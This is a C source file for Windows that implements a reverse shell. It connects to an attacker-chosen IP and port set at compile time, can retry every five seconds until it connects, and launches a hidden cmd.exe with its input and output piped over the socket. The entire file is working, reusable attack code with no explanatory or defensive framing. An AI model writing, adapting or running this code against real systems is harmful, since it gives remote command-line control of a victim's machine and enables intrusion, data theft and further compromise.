#include <winsock2.h>
#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

// Define default client IP and port if not provided
#ifndef CLIENT_IP
#define CLIENT_IP "0.0.0.0"
#endif

#ifndef CLIENT_PORT
#define CLIENT_PORT 0
#endif

int main(void) {
    // Check if CLIENT_IP and CLIENT_PORT are defined
    if (strcmp(CLIENT_IP, "0.0.0.0") == 0 || CLIENT_PORT == 0) {
        fprintf(stderr, "[ERROR] CLIENT_IP and/or CLIENT_PORT not defined.\n");
        return 1;
    }

    // Initialize Winsock
    WSADATA wsaData;
    if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) {
        fprintf(stderr, "[ERROR] WSAStartup failed.\n");
        return 1;
    }

    // Create socket
    SOCKET sock = WSASocketA(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, 0, 0);
    if (sock == INVALID_SOCKET) {
        fprintf(stderr, "[ERROR] Socket creation failed.\n");
        WSACleanup();
        return 1;
    }

    // Define server address
    struct sockaddr_in serverAddr;
    serverAddr.sin_family = AF_INET;
    serverAddr.sin_port = htons(CLIENT_PORT);
    serverAddr.sin_addr.s_addr = inet_addr(CLIENT_IP);

    // Connect to the server
    if (connect(sock, (struct sockaddr *)&serverAddr, sizeof(serverAddr)) == SOCKET_ERROR) {
#ifdef WAIT_FOR_CLIENT
        // Retry connecting if WAIT_FOR_CLIENT is defined
        while (connect(sock, (struct sockaddr *)&serverAddr, sizeof(serverAddr)) == SOCKET_ERROR) {
            Sleep(5000);
        }
#else
        fprintf(stderr, "[ERROR] Connect failed.\n");
        closesocket(sock);
        WSACleanup();
        return 1;
#endif
    }

    // Redirect standard input, output, and error to the socket
    STARTUPINFO startupInfo;
    PROCESS_INFORMATION processInfo;
    ZeroMemory(&startupInfo, sizeof(startupInfo));
    startupInfo.cb = sizeof(startupInfo);
    startupInfo.dwFlags = STARTF_USESTDHANDLES;
    startupInfo.hStdInput = (HANDLE)sock;
    startupInfo.hStdOutput = (HANDLE)sock;
    startupInfo.hStdError = (HANDLE)sock;

    // Create a new process (cmd)
    if (!CreateProcessA(NULL, "cmd", NULL, NULL, TRUE, CREATE_NO_WINDOW, NULL, NULL, &startupInfo, &processInfo)) {
        fprintf(stderr, "[ERROR] CreateProcess failed.\n");
        closesocket(sock);
        WSACleanup();
        return 1;
    }

    // Clean up
    closesocket(sock);
    WSACleanup();

    return 0;
}
